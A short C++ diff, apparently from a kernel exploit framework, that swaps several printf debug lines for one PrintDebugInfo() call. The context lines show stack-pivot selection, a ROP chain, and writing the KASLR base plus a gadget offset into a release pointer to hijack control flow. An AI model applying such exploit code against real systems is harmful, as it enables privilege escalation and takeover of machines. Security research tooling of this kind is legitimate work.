@@ -92,14 +92,8 @@ int main(int argc, const char** argv) {
 
     PivotFinder pivot_finder(target.pivots, Register::RSI, payload);
     auto rop_pivot = pivot_finder.PivotToRop(rop);
-
-    printf("[+] Selected stack pivot: %s\n", rop_pivot.pivot.GetDescription().c_str());
+    rop_pivot.PrintDebugInfo();
     *release_ptr = kaslr_base + rop_pivot.pivot.GetGadgetOffset();
-
-    for (auto& shift : rop_pivot.stack_shift.stack_shifts)
-        printf("[+] Stack jump @0x%lx: 0x%lx -> 0x%lx (size: 0x%lx)\n", shift.pivot.address,
-            shift.from_offset, shift.from_offset + shift.pivot.shift_amount, shift.pivot.shift_amount);
-    printf("[+] ROP chain offset: 0x%lx\n", rop_pivot.rop_offset);
 
     printf("[+] Payload:\n");
     HexDump::Print(payload.GetUsedData());
